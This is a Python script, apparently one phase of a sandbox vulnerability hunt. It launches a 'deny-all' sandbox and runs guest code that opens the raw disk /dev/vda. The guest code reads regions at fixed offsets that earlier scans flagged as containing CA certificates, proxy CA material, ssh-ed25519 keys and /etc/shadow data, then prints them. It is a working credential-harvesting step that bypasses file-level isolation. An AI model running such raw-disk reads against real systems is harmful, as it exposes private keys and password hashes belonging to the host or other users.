# -*- coding: utf-8 -*-
"""Phase41: 提取 ca-cert/proxy-ca/ssh-ed25519 密集区上下文(段4 新命中)"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os

fd = os.open('/dev/vda', os.O_RDONLY)

# ca-cert / proxy-ca dense region: 0x6b3be7xxx
for off in [0x6b3be7a07, 0x6b3be7a4b, 0x6b3be7aee, 0x6b3be7b1b, 0x6b3be7b32,
            0x6b3be923c, 0x6b3be927c, 0x6b3be92b9, 0x6b3be92fa, 0x6b3be9253,
            0x6b3be92d0]:
    try:
        chunk = os.pread(fd, 1536, off - 512)
        txt = chunk.replace(b'\x00', b' ')
        print('[dense 0x%x] %r' % (off, txt[:1400]), flush=True)
    except Exception as e:
        print('[dense 0x%x] EXC %s' % (off, e), flush=True)

# ssh-ed25519 region: 0x6b398cxxx
for off in [0x6b398c395, 0x6b398c3a1, 0x6b398c3c5, 0x6b398d38e, 0x6b398d6b6]:
    try:
        chunk = os.pread(fd, 2048, off - 1024)
        txt = chunk.replace(b'\x00', b' ')
        print('[ssh 0x%x] %r' % (off, txt[:1900]), flush=True)
    except Exception as e:
        print('[ssh 0x%x] EXC %s' % (off, e), flush=True)

# ca-cert lone hit at 0x6303facda
try:
    chunk = os.pread(fd, 1536, 0x6303facda - 512)
    print('[ca-cert 0x6303facda] %r' % chunk.replace(b'\x00', b' ')[:1400], flush=True)
except Exception as e:
    print('[ca-cert] EXC %s' % e, flush=True)

# shadow lone hit at 0x5abac5531
try:
    chunk = os.pread(fd, 1024, 0x5abac5531 - 256)
    print('[shadow 0x5abac5531] %r' % chunk.replace(b'\x00', b' ')[:900], flush=True)
except Exception as e:
    print('[shadow] EXC %s' % e, flush=True)

os.close(fd)
print('done', flush=True)
'''
code = "cat > /tmp/pg49.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg49.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest19")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:16000], flush=True)
